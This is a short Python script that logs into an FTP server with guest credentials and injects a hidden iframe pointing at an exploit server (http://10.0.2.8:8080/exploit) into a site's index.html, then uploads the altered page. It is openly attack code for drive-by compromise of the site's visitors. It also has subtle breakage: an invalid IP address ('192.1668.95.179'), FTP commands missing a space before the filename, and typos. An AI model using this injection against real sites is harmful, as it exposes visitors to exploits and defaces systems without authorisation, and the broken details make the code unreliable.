import ftplib


def injectpage(ftp,page,redirect):
    f = open(page + ".temp", "w")
    ftp.retrlines("retr" + page, f.write )
    print("[+] downloaded page:" + page)
    f.write(redirect)
    f.close()
    print("[-] infected malicious iframe on" + page)
    ftp.storlines("stor" + page, open(page + ".temp"))
    print("[+] uploaded injected age" + page)

host = "192.1668.95.179"
username = "guest"
password = "guest"

ftp = ftplib.FTP(host)
ftp.login(username, password)
redirect = "<iframe src= http://10.0.2.8:8080/exploit></iframe>"
injectpage(ftp , "index.html" , redirect)
